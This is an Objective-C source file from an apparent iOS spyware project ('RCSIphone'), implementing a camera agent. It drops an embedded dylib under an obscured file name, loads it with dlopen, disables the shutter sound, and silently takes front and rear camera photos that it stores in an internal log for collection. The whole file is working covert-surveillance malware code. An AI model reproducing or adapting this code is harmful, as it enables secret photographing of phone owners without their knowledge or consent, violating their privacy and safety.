//
//  RCSIAgentCamera.m
//  RCSIphone
//
//  Created by kiodo on 02/12/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//
#import <dlfcn.h>
#import <AudioToolbox/AudioToolbox.h>

#import "RCSIAgentCamera.h"
#import "RCSILogManager.h"
#import "ARMHooker.h"

#import "RCSICameraSupport.h"

//#define DEBUG_CAMERA_

typedef NSData* (*camera_t) (NSInteger);
typedef void (*disableSound_t)(void);

static RCSIAgentCamera *sharedAgentCamera = nil;
static camera_t runCamera;
static disableSound_t disableShutterSound;

@implementation RCSIAgentCamera

@synthesize mAgentConfiguration;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIAgentCamera *)sharedInstance
{
  @synchronized(self)
  {
  if (sharedAgentCamera == nil)
    {
      [[self alloc] init];
    }
  }
  
  return sharedAgentCamera;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
  if (sharedAgentCamera == nil)
    {
      sharedAgentCamera = [super allocWithZone: aZone];
      return sharedAgentCamera;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  return UINT_MAX;
}

- (void)release
{
 
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedAgentCamera != nil)
      {
        self = [super init];
      
        if (self != nil)
          {
            sharedAgentCamera = self;            
          }
      } 
  }
  
  return sharedAgentCamera;
}

#define CAM_DYLIB_NAME @"3@e337a.dib"
#define CAM_DYLIB_FUNC "runCamera"

- (BOOL)_checkCameraCompatibilty
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;

  if (gOSMajor >= 4)
    {
      NSString *path = [[NSBundle mainBundle] bundlePath];
      NSString *camDylibPathName = [[NSString alloc] initWithFormat: @"%@/%@", path, CAM_DYLIB_NAME];

      if (![[NSFileManager defaultManager] fileExistsAtPath: camDylibPathName])
        {
          NSData *tmpDylib = [[NSData alloc] initWithBytes: _tmp_camera_dylib_buff 
                                                    length: sizeof(_tmp_camera_dylib_buff)];
                                                    
          BOOL tmpB = FALSE;
          tmpB = [tmpDylib writeToFile: camDylibPathName atomically:YES];
                      
          [tmpDylib release];
        }
      
      void *cam_handle = dlopen([camDylibPathName UTF8String], RTLD_NOW);
          
      if (cam_handle != NULL &&
          (runCamera = (camera_t) dlsym(cam_handle, CAM_DYLIB_FUNC)) != NULL &&
          (disableShutterSound = (disableSound_t) dlsym(cam_handle, "disableShutterSound")) != NULL)
        {
          bRet = TRUE;
        }
        
      [camDylibPathName release];
    }  
    
  [pool release];
  
  return bRet;
}

- (void)_grabCameraShot
{
  if (gCameraActive == TRUE)
    return;
    
  //Front Log
  NSData *image = nil;
  
  image = runCamera(1);
  
  if (image != nil && [image isKindOfClass: [NSData class]])
    {
      RCSILogManager *logManager = [RCSILogManager sharedInstance];
      
      BOOL success = [logManager createLog: LOG_CAMERA
                               agentHeader: nil
                                 withLogID: 0];
      
      if (success == TRUE)
        {
          [logManager writeDataToLog: (NSMutableData*)image 
                            forAgent: LOG_CAMERA
                           withLogID: 0];
        }
        
    
      [logManager closeActiveLog: LOG_CAMERA
                     withLogID: 0];
                     
      [image release];
    }
  
  if (gCameraActive == TRUE)
    return;
      
  // Rear log
  image = runCamera(2);
  
  if (image == nil)
    return;
  
  RCSILogManager *logManager = [RCSILogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_CAMERA
                           agentHeader: nil
                             withLogID: 0];
  
  if (success == TRUE)
    {
      [logManager writeDataToLog: (NSMutableData*)image 
                        forAgent: LOG_CAMERA
                       withLogID: 0];
    }
    
  [logManager closeActiveLog: LOG_CAMERA
                   withLogID: 0];

  [image release];
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  cameraStruct *conf;
  NSData *messageRawData;
  
  if ([self _checkCameraCompatibilty] == NO)
    {
      [outerPool release];
      return;
    }
 
  disableShutterSound();
  
  messageRawData = [mAgentConfiguration objectForKey: @"data"];
  conf = (cameraStruct *)[messageRawData bytes];

  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];  

  [self _grabCameraShot];
  
  [mAgentConfiguration setObject: AGENT_STOP forKey:@"status"];
  
  [mAgentConfiguration release];
  mAgentConfiguration = nil;
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
  while (internalCounter <= MAX_WAIT_TIME)
    {
      internalCounter++;
      sleep(1);
    }
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

@end
